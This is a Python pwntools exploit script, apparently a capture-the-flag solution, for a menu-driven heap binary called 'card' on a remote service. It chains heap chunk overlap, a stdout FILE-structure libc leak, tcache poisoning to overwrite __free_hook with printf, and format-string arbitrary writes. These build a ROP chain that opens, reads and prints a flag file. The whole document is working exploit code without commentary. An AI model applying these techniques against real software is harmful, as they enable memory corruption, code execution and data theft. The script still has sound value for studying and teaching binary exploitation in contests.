#coding=utf8

from PwnContext import *

context.terminal = ['xfce4-terminal', '--tab', '-x', 'zsh', '-c']
context.log_level = 'info'
# functions for quick script
s       = lambda data               :ctx.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
sl      = lambda data               :ctx.sendline(str(data)) 
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096,timeout=2:ctx.recv(numb, timeout=timeout)
ru      = lambda delims,timeout=2, drop=True  :ctx.recvuntil(delims, drop, timeout=timeout)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, '\x00'))
uu64    = lambda data   :u64(data.ljust(8, '\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))

ctx.binary = './card'
ctx.remote = ('119.3.154.59', 9777)
#ctx.custom_lib_dir = './'
ctx.remote_libc = './libc.so.6'
ctx.debug_remote_libc = True


def add(sz):
    sla('Choice:', '1')
    sla('Size: ', str(sz))


def edit(idx, content):
    sla('Choice:', '2')
    sla('Index: ', str(idx))
    sa('Message: ', content)


def free(idx):
    sla('Choice:', '3')
    sla('Index: ', str(idx))


def raw_edit(idx, content):
    sla('Choice:', '5')
    sla('Index: ', str(idx))
    sa('Message: ', content)

#rs()
while True:
    try:
        rs('remote')
        #rs()
        add(0x18) # 0
        add(0x50) # 1
        add(0x60) # 2
        add(0x60) # 3
        add(0x70) # 4
        add(0x70) # 5
        add(0x80) # 6
        add(0x80) # 7
        add(0x90) # 8
        add(0x90) # 9
        add(0x10) # 10
        edit(1, b'a' * 0x18 + p64(0x60 + 0x70 * 2 + 0x80 * 2 + 0x90 * 2 + 0xa0 * 2 + 1))
        edit(0, b'a' * 0x18)


        free(3)
        free(2)
        free(1)

        add(0x50) # 1
        add(0x430) # 2

        # leak libc

        raw_edit(2, '\xa0\xd6')

        add(0x60) # 3
        add(0x60) # 11

        raw_edit(11, p64(0xfbad1800) + p64(0) * 3 + b'\x00')
        sleep(0.1)

        ru('\x00' * 8)
        lbase = u64(r(8)) - (0x7ffff7fc0980 - 0x7ffff7dd5000)
        leak('lbase', lbase)

        if (lbase & 0x700000000000) != 0x700000000000:
            raise EOFError()

        break
    except KeyboardInterrupt:
        exit()
    except EOFError:
        continue


__free_hook = lbase + ctx.libc.sym['__free_hook']

add(0x18)#12
add(0x18)#13
add(0x1f8)#14
add(0x1f8)#15
edit(14,b'a'*0x18+p64(0x221))
edit(12,'a'*0x18)
free(13)
free(15)
free(14)
add(0x218)#13
edit(13,b'a'*8*4+p64(__free_hook))
edit(13,'a'*(8*3+7))
edit(13,'a'*(8*3+6))
edit(13,'a'*(8*3+5))
edit(13,'a'*(8*3+4))
edit(13,'a'*(8*3+3))
edit(13,b'a'*(8*3)+p64(0x201))
add(0x1f8)#14
add(0x1f8)#15


printf = lbase + ctx.libc.sym['printf']
edit(15, p64(printf))


idx = 16
def call_printf(s): 
    add(0x100) # 16
    edit(idx, s)
    free(idx)
    sleep(0.1)


call_printf("123%30$p%9$p")
sleep(0.1)
ru('123')
stack=int(r(14),16)
text=int(r(14),16) - (0x5555555558e4-0x555555554000)

leak('stack', stack)
leak('text', text)


call_printf("%{}c%30$hn".format((stack - 0x60) & 0xffff))
def write_byte(addr, byte):
    # 布置地址

    for i in range(8):
        ref = (stack - 0x60 + i) & 0xff
        if ref > 0:
            call_printf("%{}c%30$hhn".format(ref))
        else:
            call_printf("%30$hhn")

        num = (addr >> (8 * i)) & 0xff
        if num > 0:
            call_printf("%{}c%43$hhn".format(num))
        else:
            call_printf("%43$hhn")

    byte = ord(byte)

    if byte > 0:
        call_printf("%{}c%31$hhn".format(byte))
    else:
        call_printf("%31$hhn")

def write_content(addr, content):
    for i in range(len(content)):
        write_byte(addr+i, content[i])




rdi= 0x1963+text
rsi= 0x1961+text
rdx= 0x1626d5+lbase
bss = text + 0x004c60
leave_ret = text + 0x001869
add_rsp_pp_ret = lbase + 0x0000000000085bf8 + 2

ret_addr = stack - (0x7fffffffede8 - 0x7fffffffecd8)

rop=p64(rdi)+p64(bss+0x100)
rop+=p64(rsi)+p64(0) * 2
rop+=p64(rdx)+p64(0) * 3
rop+=p64(lbase+ctx.libc.sym['open'])

rop+=p64(rdi)+p64(3)
rop+=p64(rsi)+p64(bss) * 2
rop+=p64(rdx)+p64(0x100) * 3
rop+=p64(lbase+ctx.libc.sym['read'])


rop+=p64(rdi)+p64(1)
rop+=p64(rsi)+p64(bss) * 2
rop+=p64(rdx)+p64(0x100) * 3
rop+=p64(lbase+ctx.libc.sym['write'])

add(0x300) # 16

#dbg('b *0x5555555554B7\nc')
edit(16, '\x00' * 0x100 + './flag\x00\x00' + '\x00' * 8 + rop)



idx += 1
write_content(ret_addr+8, p64(add_rsp_pp_ret))
write_content(ret_addr+0x20, p64(bss+0x110-8))
write_content(ret_addr+0x28, p64(leave_ret))


context.log_level = 'debug'
write_content(ret_addr, '\x6a')

irt()